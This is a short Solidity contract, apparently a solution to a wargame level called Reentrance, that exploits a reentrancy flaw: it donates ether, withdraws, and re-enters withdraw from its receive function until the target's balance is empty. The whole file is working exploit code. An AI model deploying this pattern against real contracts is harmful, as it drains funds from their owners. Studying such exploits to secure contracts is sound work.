// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function takeEverything() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(1 ether);
        }
    }
}
